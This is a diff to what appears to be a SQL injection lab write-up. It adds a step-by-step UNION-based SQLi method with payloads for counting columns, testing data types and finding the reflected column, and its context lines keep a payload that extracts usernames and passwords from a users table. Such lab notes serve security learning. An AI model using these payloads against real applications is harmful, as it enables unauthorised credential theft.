@@ -18,6 +18,15 @@ This lab contains a SQL injection vulnerability in the product category filter. 
 '+UNION+SELECT+NULL,username||'~'||password+FROM+users--.
 4. Verify that the application's response contains usernames and passwords.
 
+
+UNION SQLi Flow
+
+1. Find injection point   (' UNION SELECT NULL,NULL,NULL--)
+2. Find number of columns  ( three coloumns in the SELECT )
+3. Test datatype compatibility  ( ' UNION SELECT 'test',NULL,NULL--)
+4. Identify reflected/visible column ( ' UNION SELECT NULL,NULL,'c'--)
+5. Continue testing based on lab objective  
+
 ## Screenshot
 
 
